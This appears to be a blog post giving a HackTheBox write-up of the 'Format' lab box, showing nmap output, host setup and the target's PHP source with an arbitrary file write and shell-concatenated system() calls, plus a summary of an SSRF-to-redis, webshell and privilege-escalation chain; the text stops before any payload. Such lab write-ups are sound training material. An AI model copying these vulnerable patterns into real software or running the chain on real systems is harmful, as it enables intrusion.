@@ -1,0 +1,1479 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Format is a medium difficulty box with a web blog generator service. An extra open port reveals a git repository with all of the source code and, using this information, we can find an Arbitrary File Write vulnerability, and a web-accessible folder with read/write/execute permissions. The folder is only generated for Pro users, so first we abuse a misconfiguration in nginx's proxy_pass settings. The misconfiguration allows us to perform Server-Side Request Forgery to the redis database and set the pro flag on our account to true. Using the file write vulnerability, we generate a webshell in the web-accesible folder with read/write/execute permissions, and gain access as www-data. Enumerating the redis database provides us with re-used credentials for a user, and the user can run a custom python script as root. By abusing a flaw in python string's format function, we can dump all global variables, one of which is the password for the root user.">
+<title>HackTheBox - Format</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hackthebox-format/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Format">
+<meta property='og:description' content="Format is a medium difficulty box with a web blog generator service. An extra open port reveals a git repository with all of the source code and, using this information, we can find an Arbitrary File Write vulnerability, and a web-accessible folder with read/write/execute permissions. The folder is only generated for Pro users, so first we abuse a misconfiguration in nginx's proxy_pass settings. The misconfiguration allows us to perform Server-Side Request Forgery to the redis database and set the pro flag on our account to true. Using the file write vulnerability, we generate a webshell in the web-accesible folder with read/write/execute permissions, and gain access as www-data. Enumerating the redis database provides us with re-used credentials for a user, and the user can run a custom python script as root. By abusing a flaw in python string's format function, we can dump all global variables, one of which is the password for the root user.">
+<meta property='og:url' content='http://localhost:1313/p/hackthebox-format/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Arbitrary File Write' /><meta property='article:tag' content='redis' /><meta property='article:tag' content='git' /><meta property='article:tag' content='Python' /><meta property='article:tag' content='SSRF' /><meta property='article:published_time' content='2023-09-30T09:11:52-05:00'/><meta property='article:modified_time' content='2023-09-30T09:11:52-05:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-format/Format.png' />
+<meta name="twitter:title" content="HackTheBox - Format">
+<meta name="twitter:description" content="Format is a medium difficulty box with a web blog generator service. An extra open port reveals a git repository with all of the source code and, using this information, we can find an Arbitrary File Write vulnerability, and a web-accessible folder with read/write/execute permissions. The folder is only generated for Pro users, so first we abuse a misconfiguration in nginx's proxy_pass settings. The misconfiguration allows us to perform Server-Side Request Forgery to the redis database and set the pro flag on our account to true. Using the file write vulnerability, we generate a webshell in the web-accesible folder with read/write/execute permissions, and gain access as www-data. Enumerating the redis database provides us with re-used credentials for a user, and the user can run a custom python script as root. By abusing a flaw in python string's format function, we can dump all global variables, one of which is the password for the root user."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-format/Format.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#web-server-source-code-found-on-port-3000">Web server source code found on port 3000</a></li>
+        <li><a href="#enumerating-the-main-web-server">Enumerating the main web server</a></li>
+        <li><a href="#discovering-file-write-vulnerability-in-source-code">Discovering file write vulnerability in source code</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#ssrf-to-redis-database-via-nginx-misconfiguration">SSRF to redis database via nginx misconfiguration</a></li>
+        <li><a href="#arbitrary-file-write-to-create-a-webshell">Arbitrary File Write to create a webshell</a></li>
+      </ol>
+    </li>
+    <li><a href="#lateral-movement">Lateral Movement</a>
+      <ol>
+        <li><a href="#enumerating-redis-database">Enumerating redis database</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#abusing-python-string-format">Abusing Python String format()</a></li>
+      </ol>
+    </li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-format/">
+                <img src="/p/hackthebox-format/Format_hu2932990934854150007.png"
+                        srcset="/p/hackthebox-format/Format_hu2932990934854150007.png 800w, /p/hackthebox-format/Format_hu11630797980677460254.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Format" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-format/">HackTheBox - Format</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Format is a medium difficulty box with a web blog generator service. An extra open port reveals a git repository with all of the source code and, using this information, we can find an Arbitrary File Write vulnerability, and a web-accessible folder with read/write/execute permissions. The folder is only generated for Pro users, so first we abuse a misconfiguration in nginx&#39;s proxy_pass settings. The misconfiguration allows us to perform Server-Side Request Forgery to the redis database and set the pro flag on our account to true. Using the file write vulnerability, we generate a webshell in the web-accesible folder with read/write/execute permissions, and gain access as www-data. Enumerating the redis database provides us with re-used credentials for a user, and the user can run a custom python script as root. By abusing a flaw in python string&#39;s format function, we can dump all global variables, one of which is the password for the root user.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 30, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    11 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration
+</h2><p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.10.11.213
+</span></span><span class="line"><span class="cl">Host is up (0.048s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
+</span></span><span class="line"><span class="cl">|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp   open  http    nginx 1.18.0
+</span></span><span class="line"><span class="cl">|_http-title: Site doesn&#39;t have a title (text/html).
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0
+</span></span><span class="line"><span class="cl">3000/tcp open  http    nginx 1.18.0
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://microblog.htb:3000/
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is an interesting web port 3000, and it redirects to <code>microblog.htb</code>. I will add this to my /etc/hosts file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Format]
+</span></span><span class="line"><span class="cl">└─$ tail /etc/hosts    
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">127.0.1.1       kali
+</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.10.11.213 microblog.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visiting the page is a git server:
+<img src="/p/hackthebox-format/Images/microblog_page.png"
+	width="1254"
+	height="568"
+	srcset="/p/hackthebox-format/Images/microblog_page_hu1920489087569552892.png 480w, /p/hackthebox-format/Images/microblog_page_hu10230522910903299320.png 1024w"
+	loading="lazy"
+	
+		alt="microblog landing page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="220"
+		data-flex-basis="529px"
+	
+></p>
+<h3 id="web-server-source-code-found-on-port-3000">Web server source code found on port 3000
+</h3><p>Exploring for public repositories, we find a microblog repo by cooper:
+<img src="/p/hackthebox-format/Images/microblog_repo.png"
+	width="1138"
+	height="704"
+	srcset="/p/hackthebox-format/Images/microblog_repo_hu7687631479407040424.png 480w, /p/hackthebox-format/Images/microblog_repo_hu17884670798065142.png 1024w"
+	loading="lazy"
+	
+		alt="repository main dir"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="161"
+		data-flex-basis="387px"
+	
+></p>
+<p>I don&rsquo;t find any cleartext credentials, but I do find another subdomain on the index.html file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Refresh&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;0; url=&#39;http://app.microblog.htb&#39;&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When trying to visit the main site on port 80, we are also redirected again to <code>app.microblog.htb</code>, so this should be added to /etc/hosts as well.</p>
+<h3 id="enumerating-the-main-web-server">Enumerating the main web server
+</h3><p>The main page is a blogging website. There are options to log in or register:
+<img src="/p/hackthebox-format/Images/app_microblog_page.png"
+	width="1579"
+	height="562"
+	srcset="/p/hackthebox-format/Images/app_microblog_page_hu5474978768661900867.png 480w, /p/hackthebox-format/Images/app_microblog_page_hu2447084466942534534.png 1024w"
+	loading="lazy"
+	
+		alt="app.microblog landing page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="280"
+		data-flex-basis="674px"
+	
+></p>
+<p>Registering with the classic asdf credentials:
+<img src="/p/hackthebox-format/Images/register.png"
+	width="635"
+	height="518"
+	srcset="/p/hackthebox-format/Images/register_hu18158088930672523.png 480w, /p/hackthebox-format/Images/register_hu3970313362182515253.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="122"
+		data-flex-basis="294px"
+	
+></p>
+<p>With an account, we can create blog subdomains:
+<img src="/p/hackthebox-format/Images/testa.png"
+	width="1787"
+	height="746"
+	srcset="/p/hackthebox-format/Images/testa_hu10659690926018206647.png 480w, /p/hackthebox-format/Images/testa_hu11980106982656937804.png 1024w"
+	loading="lazy"
+	
+		alt="created testa blog site. Visitng site takes us to testa.microblog.htb"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="574px"
+	
+></p>
+<p>The source code in the repository found at port 3000 is utilized by this website. We can explore the code, and potentially find vulnerabilities in how the program behaves.</p>
+<h3 id="discovering-file-write-vulnerability-in-source-code">Discovering file write vulnerability in source code
+</h3><p>Under the edit page, the command to add text will write our contents to an <code>id</code> field:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//add text
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&#34;/../content&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$txt_nl</span> <span class="o">=</span> <span class="nx">nl2br</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$html</span> <span class="o">=</span> <span class="s2">&#34;&lt;div class = </span><span class="se">\&#34;</span><span class="s2">blog-text</span><span class="se">\&#34;</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$txt_nl</span><span class="si">}</span><span class="s2">&lt;/div&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$post_file</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">,</span> <span class="nv">$html</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$order_file</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;order.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /edit?message=Section added!&amp;status=success&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>id</code> will determine the path, and since this is not path protected, we can choose any place we like. This is Arbitrary File Write, an extremely dangerous oversight. However, this seems largely mitigated by removing write permissions in other folders.</p>
+<p>Also under the edit page, we can see that if <code>isPro</code> is set, there exists a folder that retains writing privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">provisionProUser</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isPro</span><span class="p">()</span> <span class="o">===</span> <span class="s2">&#34;true&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$blogName</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nx">getBlogName</span><span class="p">()));</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;chmod +w /var/www/microblog/&#34;</span> <span class="o">.</span> <span class="nv">$blogName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;chmod +w /var/www/microblog/&#34;</span> <span class="o">.</span> <span class="nv">$blogName</span> <span class="o">.</span> <span class="s2">&#34;/edit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cp /var/www/pro-files/bulletproof.php /var/www/microblog/&#34;</span> <span class="o">.</span> <span class="nv">$blogName</span> <span class="o">.</span> <span class="s2">&#34;/edit/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;mkdir /var/www/microblog/&#34;</span> <span class="o">.</span> <span class="nv">$blogName</span> <span class="o">.</span> <span class="s2">&#34;/uploads &amp;&amp; chmod 700 /var/www/microblog/&#34;</span> <span class="o">.</span> <span class="nv">$blogName</span> <span class="o">.</span> <span class="s2">&#34;/uploads&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;chmod -w /var/www/microblog/&#34;</span> <span class="o">.</span> <span class="nv">$blogName</span> <span class="o">.</span> <span class="s2">&#34;/edit &amp;&amp; chmod -w /var/www/microblog/&#34;</span> <span class="o">.</span> <span class="nv">$blogName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After all commands are finished, we are left with an /uploads folder under our blog, with 700 permissions. The creator, in this case the web service account, can read/write/execute files within this location. The exploit chain is now clear. If we can trigger <code>provisionProUser</code>, we will be able to write a webshell in the uploads folder using Arbitrary File Write.
+This function is dependent on <code>isPro()</code> being set to true. Looking for <code>isPro</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isPro</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Redis</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">(</span><span class="s1">&#39;/var/run/redis/redis.sock&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$pro</span> <span class="o">=</span> <span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">HGET</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="s2">&#34;pro&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">strval</span><span class="p">(</span><span class="nv">$pro</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;false&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The program is utilizing a <code>redis</code> sock to store credentials and characteristics of accounts. When we check the register page to see how accounts are created, we can see <code>pro</code> is set to false when a user is created:</p>
+<div class="highlight"><div class="chroma">
